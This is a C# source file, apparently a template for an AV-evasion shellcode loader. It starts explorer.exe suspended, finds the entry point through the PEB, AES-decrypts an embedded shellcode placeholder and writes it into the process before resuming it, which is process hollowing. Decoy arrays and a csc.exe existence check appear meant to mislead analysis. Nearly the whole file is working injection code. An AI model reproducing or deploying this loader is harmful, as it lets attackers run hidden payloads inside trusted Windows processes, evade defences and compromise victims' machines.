
using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Security.Cryptography;


namespace hollow
{
    class Program
    {

        private static byte[] basecode = new byte[] { 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, };

        private static string oldcode = "0123456789";

        private static byte[] AESDecryptor(byte[] baEncrypedShellCode, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.PKCS7;
                aes.Mode = CipherMode.CBC;
                aes.Key = key;
                aes.IV = iv;
                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(baEncrypedShellCode, decryptor);
                }
            }
        }
        private static byte[] PerformCryptography(byte[] data, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(data, 0, data.Length);
                cryptoStream.FlushFinalBlock();
                return ms.ToArray();
            }
        }

        static void Main(string[] args)
        {



            byte[] Key = Convert.FromBase64String("KEY_RETURN");
            byte[] IV = Convert.FromBase64String("IV_RETURN");
            WinAPI.STARTUPINFO si = new WinAPI.STARTUPINFO();
            WinAPI.PROCESS_INFORMATION pi = new WinAPI.PROCESS_INFORMATION();
            bool res = WinAPI.CreateProcess(null, "C:\\Windows\\explorer.exe", IntPtr.Zero, IntPtr.Zero, false, 0x00000004 | 0x08000000, IntPtr.Zero, null, ref si, out pi);
            WinAPI.PROCESS_BASIC_INFORMATION bi = new WinAPI.PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            WinAPI.ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebBaseAddress + 0x10);
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            WinAPI.ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
            try
            {
                if (File.Exists(@"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"))
                {
                    byte[] data = new byte[0x200];
                    WinAPI.ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead); //读取从缓冲区中定位入口点
                    uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3c);
                    uint opthdr = e_lfanew_offset + 0x28;
                    uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
                    IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);  // 

                    byte[] buf = new byte[] {SHELLCODE_RETURN};

                    byte[] decshell = AESDecryptor(buf, Key, IV);
                    IntPtr addr = WinAPI.VirtualAllocEx(hProcess, IntPtr.Zero, (uint)decshell.Length, 0x3000, 0x40); //分配虚拟内存
                    WinAPI.WriteProcessMemory(hProcess, addressOfEntryPoint, decshell, decshell.Length, out nRead); //将解密后的shellcode写入目标进程入口点。
                }

                else
                {
                    for (int i = 0; i < basecode.Length; i++)
                    {
                        Console.WriteLine(addrBuf.Length.ToString());
                    }
                }

                WinAPI.resume(pi);

            }
            catch (Exception ex)
            {
                return;
            }
        
        }


        public class WinAPI
        {
            public static void resume(WinAPI.PROCESS_INFORMATION pi = new WinAPI.PROCESS_INFORMATION())
            {
                try
                {
                    for (int j = 0; j < oldcode.Length - 9; j++)
                    {
                        ResumeThread(pi.hThread);
                    }
                }
                catch (Exception ex)
                {
                    return;
                }


            }
            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
            public struct STARTUPINFO
            {
                public Int32 cb;
                public string lpReserved;
                public string lpDesktop;
                public string lpTitle;
                public Int32 dwX;
                public Int32 dwY;
                public Int32 dwXSize;
                public Int32 dwYSize;
                public Int32 dwXCountChars;
                public Int32 dwYCountChars;
                public Int32 dwFillAttribute;
                public Int32 dwFlags;
                public Int16 wShowWindow;
                public Int16 cbReserved2;
                public IntPtr lpReserved2;
                public IntPtr hStdInput;
                public IntPtr hStdOutput;
                public IntPtr hStdError;
            }

            [StructLayout(LayoutKind.Sequential)]
            /*C#中的IntPtr类型称为“平台特定的整数类型”，它们用于本机资源，如窗口句柄。
            资源的大小取决于使用的硬件和操作系统，但其大小总是足以包含系统的指针（因此也可以包含资源的名称）。*/
            internal struct PROCESS_INFORMATION
            {
                public IntPtr hProcess;
                public IntPtr hThread;
                public int dwProcessId;
                public int dwThreadId;
            }

            [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
            public static extern bool CreateProcess(string lpApplicationName,string lpCommandLine, IntPtr lpProcessAttributes,IntPtr lpThreadAttributes,bool bInheritHandles, uint dwCreationFlags,IntPtr lpEnvironment,string lpCurrentDirectory,[In] ref STARTUPINFO lpStartupInfo,out PROCESS_INFORMATION lpProcessInformation);

            public struct PROCESS_BASIC_INFORMATION
            {
                public IntPtr ExitStatus;
                public IntPtr PebBaseAddress;
                public UIntPtr AffinityMask;
                public int BasePriority;
                public UIntPtr UniqueProcessId;
                public UIntPtr InheritedFromUniqueProcessId;
            }

            [DllImport("ntdll.dll", SetLastError = true)]
            //检索有关指定进程的信息
            public static extern UInt32 ZwQueryInformationProcess(IntPtr hProcess,int procInformationClass,ref PROCESS_BASIC_INFORMATION procInformation,UInt32 ProcInfoLen,ref UInt32 retlen);
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool ReadProcessMemory(IntPtr hProcess,IntPtr lpBaseAddress,byte[] lpBuffer,Int32 nSize,out IntPtr lpNumberOfBytesRead);
            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            public static extern IntPtr VirtualAllocEx(IntPtr hProcess,IntPtr lpAddress,uint dwSize,uint flAllocationType,uint flProtect);

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool WriteProcessMemory(IntPtr hProcess,IntPtr lpBaseAddress,byte[] lpBuffer,Int32 nSize,out IntPtr lpNumberOfBytesWritten);

            [DllImport("kernel32.dll", SetLastError = true)]
            static extern uint ResumeThread(IntPtr hThread);

            [DllImport("kernel32.dll")]
            static extern bool VirtualProtectEx(IntPtr hProcess,IntPtr lpAddress, UIntPtr dwSize,  uint flNewProtect, out uint lpflOldProtect);//原访问方式 用于保存改变前的保护属性 
        }


    }


}
